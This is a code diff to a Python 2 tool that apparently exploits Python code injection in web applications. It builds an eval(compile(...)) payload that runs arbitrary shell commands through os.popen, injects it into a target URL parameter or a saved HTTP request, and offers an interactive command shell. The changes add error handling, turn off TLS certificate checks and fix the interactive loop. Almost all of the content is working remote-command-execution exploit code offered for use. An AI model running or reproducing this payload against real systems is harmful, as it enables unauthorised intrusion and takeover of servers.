@@ -6,7 +6,8 @@
           
 """
 
-import requests, re, optparse, urllib, os
+import requests, re, optparse, urllib, os, ssl
+from HTMLParser import HTMLParser
 
 #Taken from http://stackoverflow.com/questions/2115410/does-python-have-a-module-for-parsing-http-requests-and-responses
 from BaseHTTPServer import BaseHTTPRequestHandler
@@ -24,7 +25,7 @@ class HTTPRequest(BaseHTTPRequestHandler):
         self.error_message = message
 
 def parse_url(command,user_url,user_param=None):
-    print user_param
+    #print user_param
     insert = '''eval(compile("""for x in range(1):\\n import os\\n print("-"*50)\\n os.popen(r'%s').read()""",'PyCodeInjectionShell','single'))''' % command
     #insert = '''eval(compile("""for x in range(1):\\n import subprocess\\n print("-"*50)\\n subprocess.Popen(r'%s', shell=True,stdout=subprocess.PIPE).stdout.read()""",'PyCodeInjectionShell','single'))''' % command
     encoded = urllib.quote(insert)
@@ -32,13 +33,20 @@ def parse_url(command,user_url,user_param=None):
     if user_param == None:
         # Look for the * and replace * with the payload
         split_user_url = user_url.split('*')
-        url = '%s%s%s' % (split_user_url[0],encoded,split_user_url[1])
+        try:
+            url = '%s%s%s' % (split_user_url[0],encoded,split_user_url[1])
+        except:
+            print "[!] Injection point not defined. Use either the * or -p parameter to show where to inject"
+            exit()
     else:
         # Look for the user specified parameter and replace the parameter value with the payload
         split_user_url = user_url.split("%s=" % user_param)
         suffix = split_user_url[1].split('&')[1]
-        url = '%s%s=%s&%s' % (split_user_url[0],user_param,encoded,suffix)
-    print("URL sent to server: " + url)
+        try:
+            url = '%s%s=%s&%s' % (split_user_url[0],user_param,encoded,suffix)
+        except:
+            print "[!]URL specified"
+    #print("URL sent to server: " + url)
     return url
 
 def parse_request(command,filename,user_param=None):
@@ -55,7 +63,7 @@ def parse_request(command,filename,user_param=None):
             updated2 = re.sub('Accept:.*',str(acceptline.group(0)), updated)        
             req_obj = HTTPRequest(updated2)
         else:
-            print "Request file and specified parameter are not currently supported together. \nPlease place a * in the request file\n"
+            print "[!] Request file and specified parameter are not currently supported together. \n[!]Please place a * in the request file\n"
             exit()
         #print updated2
         url = '%s%s' % (req_obj.headers['host'],req_obj.path)
@@ -88,7 +96,7 @@ def select_command(user_url,user_param=None):
     #print match
     try:
         command_output = str(match.group(0))
-        print '\n\n{}\nOUTPUT OF: {}\n{}\n'.format('-'*30,command,'-'*30)
+        print '\n{}\nOUTPUT OF: {}\n{}'.format('-'*30,command,'-'*30)
         print command_output.replace('\\n','\n')
         # print command_output
     except:
@@ -97,36 +105,48 @@ def select_command(user_url,user_param=None):
         print response
 
 def send_request(url,command,headers=None,data=None):
-    #print headers
+    # Request files don't specify HTTP vs HTTPS, so I'm trying to try both instead of 
+    # asking the user.  If no http or https, first try http, and if that errors, try 
+    # https.  Request files can be used for GET's also, so I pull that part out as well.  
+     
     if 'http' not in url:        
         try:
             http_url = 'http://%s' % url
             if (data):
-                response = requests.post(http_url, headers=headers, data=data)
+                response = requests.post(http_url, headers=headers, data=data, verify=False)
             else:
-                response = requests.get(http_url, headers=headers)
+                response = requests.get(http_url, headers=headers, verify=False)
         except Exception as error:
             print error
             try:
                 https_url = 'https://%s' % url
                 if (data):
-                    response = requests.post(https_url, headers=headers, data=data)
+                    response = requests.post(https_url, headers=headers, data=data, verify=False)
                 else:
-                    response = requests.get(https_url, headers=headers)
+                    response = requests.get(https_url, headers=headers, verify=False)
             except Exception as error:
                 print error
     else:
-        response = requests.get(url, headers=headers)
+        try:
+            response = requests.get(url, headers=headers, verify=False)
+        except Exception as error:
+            print "[!] Failed to establish connection"
+            print error
+            exit()
     #print response.headers
     #print response.content
     match = re.search('([---------------------------------------------------][\n])(.*)',response.content)
     try:
         command_output = str(match.group(0))
-        print '\n\n{}\nOUTPUT OF: {}\n{}\n'.format('-'*30,command,'-'*30)
-        print command_output.replace('\\n','\n')
+        print '\n{}\nOUTPUT OF: {}\n{}'.format('-'*30,command,'-'*30)
+        #print command_output.replace('\\n','\n')
+        command_output = command_output.replace('\\n','\n')
+        h = HTMLParser()
+        print (h.unescape(command_output))
+         
         # print command_output
     except Exception as error:
-        print "\nCould not found command output.  Debug info:\n"
+        print "\n[!] Could not found command output.  Debug info:\n"
         print "---------------Response Headers---------------"
         print response.headers
         print "---------------Response Content---------------"
@@ -175,13 +195,13 @@ if __name__ == '__main__':
     request = options.request
     #parameter = options.parameter
     #print options.parameter
-    print
+    #print
     if (options.url) and (options.request):
         print "Either enter a URL or a request file, but not both."
         exit()
 
     if (options.url) and (options.parameter):
-        print("URL entered by user: " + options.url)
+        #print("URL entered by user: " + options.url)
         parsed_url = parse_url(options.cmd,options.url,options.parameter)
         send_request(parsed_url,options.cmd)
 
@@ -192,7 +212,7 @@ if __name__ == '__main__':
                 send_request(url,new_cmd)
 
     if (options.url) and not (options.parameter):
-        print("URL entered by user: " + options.url)
+        #print("URL entered by user: " + options.url)
         parsed_url = parse_url(options.cmd,options.url,options.parameter)
         send_request(parsed_url,options.cmd)
         if (options.interactive):            
@@ -209,4 +229,4 @@ if __name__ == '__main__':
             while True:                
                 new_cmd = raw_input("Command:")
                 parsed_url,headers,data = parse_request(new_cmd,options.request,options.parameter)
-                send_request(parsed_url,options.cmd,headers,data)
+                send_request(parsed_url,new_cmd,headers,data)
